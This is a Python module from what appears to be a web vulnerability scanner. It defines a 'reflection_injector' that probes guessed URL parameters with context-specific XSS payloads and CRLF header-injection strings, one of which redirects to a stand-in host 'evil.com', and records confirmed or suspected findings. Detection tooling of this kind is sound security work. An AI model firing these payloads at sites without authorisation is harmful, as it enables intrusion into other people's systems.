import re
from typing import Optional
from urllib.parse import urlparse, parse_qs

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScanTarget, Endpoint, Finding, ScannerManifest


CONTEXT_PAYLOADS: list[tuple[str, list[str], str, str]] = [
    # (context_label, payloads, confirmation_pattern, description_tag)
    ("html_body", [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
    ], r'on\w+\s*=', "XSS via HTML event handler"),

    ("script", [
        "</script><script>alert(1)</script>",
        "</Script><script>alert(1)</script>",
    ], r'</script>\s*<script>', "XSS via script block break"),

    ("script_string_sq", [
        "'-alert(1)-'",
        "';alert(1);//",
        "'-confirm(1)-'",
    ], r"alert|confirm", "XSS via single-quote JS string break"),

    ("script_string_dq", [
        "\"-alert(1)-'",
        "\";alert(1);//",
    ], r"alert", "XSS via double-quote JS string break"),

    ("attribute_dq", [
        '" onfocus=alert(1) autofocus="',
        '" onmouseover=alert(1) x="',
        '" onfocus=confirm(1) autofocus="',
    ], r'on\w+\s*=\s*alert|on\w+\s*=\s*confirm', "XSS via double-quoted attribute break"),

    ("attribute_sq", [
        "' onfocus=alert(1) autofocus='",
        "' onmouseover=alert(1) x='",
    ], r'on\w+\s*=\s*alert', "XSS via single-quoted attribute break"),

    ("href", [
        "javascript:alert(1)",
        "javascript:confirm(1)",
    ], r'javascript:\s*(alert|confirm)', "XSS via javascript: URI"),

    ("json_string", [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ], r'on\w+\s*=\s*alert', "XSS in JSON response context"),

    ("angular", [
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
    ], r"constructor\.constructor|49", "Angular/SPA template injection"),
]

CRLF_PAYLOADS = [
    ("%0d%0aSet-Cookie:%20test=1", "Set-Cookie", "CRLF — Set-Cookie injection"),
    ("%0aSet-Cookie:%20test=1", "Set-Cookie", "CRLF (LF only) — Set-Cookie injection"),
    ("%0d%0aLocation:%20//evil.com", "Location: //evil", "CRLF — Location injection"),
    ("%0d%0aX-Injected:%20test", "X-Injected: test", "CRLF — custom header injection"),
]

REFLECTION_INDICATORS_BY_CONTEXT: dict[str, list[str]] = {
    "html_body": ["<img", "<svg", "<details", "<body", "onerror=", "onload=", "ontoggle="],
    "script": ["</script><script>", "</Script><script>"],
    "script_string_sq": ["-alert(1)-", ";alert(1);"],
    "script_string_dq": ["-alert(1)-'", ";alert(1);"],
    "attribute_dq": ["onfocus=", "onmouseover=", "autofocus="],
    "attribute_sq": ["onfocus=", "onmouseover=", "autofocus="],
    "href": ["javascript:alert", "javascript:confirm"],
    "json_string": ["<img", "<svg", "onerror=", "onload="],
    "angular": ["constructor.constructor", "49"],
}


@register_scanner(manifest=ScannerManifest(
    name="reflection_injector",
    category="exploit",
    risk_level="aggressive",
    prerequisites=["reflection_mapper"],
    estimated_cost=50,
    produces_tag_patterns=["reflection", "xss", "content-injection", "crlf"],
))
class ReflectionInjector(BaseScanner):
    @property
    def name(self) -> str:
        return "reflection_injector"

    async def scan(self, target: ScanTarget) -> tuple[list[Finding], list[Endpoint]]:
        findings: list[Finding] = []
        endpoints: list[Endpoint] = []

        params = await self._discover_params(target.url)
        if not params:
            return findings, endpoints

        base = target.url.split("?")[0].rstrip("/")

        for param_name in params:
            await self._test_body_reflection(base, param_name, findings)
            await self._test_crlf(base, param_name, findings)

        return findings, endpoints

    async def _test_body_reflection(
        self, base_url: str, param_name: str, findings: list[Finding]
    ):
        for ctx_label, payloads, confirm_pattern, desc_tag in CONTEXT_PAYLOADS:
            for payload in payloads:
                try:
                    resp = await self.request("GET", base_url, params={param_name: payload})
                except Exception:
                    continue

                body = resp.text
                indicators = REFLECTION_INDICATORS_BY_CONTEXT.get(ctx_label, [])
                matched = [i for i in indicators if i in body]
                context_confirmed = bool(re.search(confirm_pattern, body, re.I))

                if matched and context_confirmed:
                    severity = "critical" if "xss" in desc_tag.lower() else "high"
                    findings.append(self.make_finding(
                        title=f"Exploitable Reflective Injection — {desc_tag}",
                        description=f"Parameter '{param_name}' at {base_url} is exploitable "
                                    f"for reflective injection. Context: {ctx_label}. "
                                    f"Payload: {payload}",
                        severity=severity,
                        endpoint=self.make_endpoint(base_url, discovered_by=self.name),
                        evidence={
                            "param": param_name,
                            "payload": payload,
                            "context": ctx_label,
                            "indicators": matched,
                            "body_snippet": body[:300],
                        },
                        confidence=0.85,
                        tags=["reflection", "xss", ctx_label, "confirmed"],
                    ))
                    return
                elif matched and not context_confirmed:
                    findings.append(self.make_finding(
                        title=f"Reflective Injection Suspected — {desc_tag}",
                        description=f"Parameter '{param_name}' at {base_url} shows partial "
                                    f"reflection indicators but context breakout not confirmed. "
                                    f"Context: {ctx_label}",
                        severity="medium",
                        endpoint=self.make_endpoint(base_url, discovered_by=self.name),
                        evidence={
                            "param": param_name,
                            "payload": payload,
                            "context": ctx_label,
                            "indicators": matched,
                            "body_snippet": body[:300],
                        },
                        confidence=0.5,
                        tags=["reflection", "xss", ctx_label, "suspected"],
                    ))
                    return

                if payload in body:
                    findings.append(self.make_finding(
                        title="Raw Payload Reflected (unconfirmed exploit)",
                        description=f"Parameter '{param_name}' at {base_url} reflects payload "
                                    f"verbatim but no breakout confirmation. Context: {ctx_label}",
                        severity="low",
                        endpoint=self.make_endpoint(base_url, discovered_by=self.name),
                        evidence={
                            "param": param_name,
                            "payload": payload,
                            "context": ctx_label,
                            "body_snippet": body[:200],
                        },
                        confidence=0.4,
                        tags=["reflection", ctx_label, "unconfirmed"],
                    ))
                    return

    async def _test_crlf(
        self, base_url: str, param_name: str, findings: list[Finding]
    ):
        for payload, indicator, desc in CRLF_PAYLOADS:
            try:
                resp = await self.request("GET", base_url, params={param_name: payload})
            except Exception:
                continue

            injected = False
            for key, value in resp.headers.items():
                combined = f"{key}: {value}"
                if "test=1" in combined or "//evil" in combined or "X-Injected" in combined:
                    injected = True
                    break

            if injected:
                findings.append(self.make_finding(
                    title=desc,
                    description=f"Parameter '{param_name}' at {base_url} enables CRLF injection. "
                                f"Payload: {payload}",
                    severity="high",
                    endpoint=self.make_endpoint(base_url, discovered_by=self.name),
                    evidence={
                        "param": param_name,
                        "payload": payload,
                        "injected_indicator": indicator,
                    },
                    confidence=0.8,
                    tags=["reflection", "crlf", "header-injection"],
                ))
                return

    async def _discover_params(self, url: str) -> list[str]:
        params: set[str] = set()

        parsed = urlparse(url)
        for p in parse_qs(parsed.query):
            params.add(p)

        COMMON = [
            "q", "s", "search", "query", "id", "page", "p", "lang", "sort",
            "filter", "type", "category", "name", "user", "term", "keyword",
            "file", "path", "url", "next", "redirect", "return", "callback",
            "jsonp", "format", "view", "mode", "action", "msg", "message",
            "error", "text", "output", "debug", "log", "theme", "color",
            "target", "host", "port", "referer", "ref", "source", "site",
            "template", "include", "document", "folder", "page", "style",
        ]
        for p in COMMON:
            params.add(p)

        try:
            resp = await self.request("GET", url)
            for match in re.finditer(r'name=["\']([^"\']+)["\']', resp.text, re.I):
                params.add(match.group(1))
        except Exception:
            pass

        return list(params)
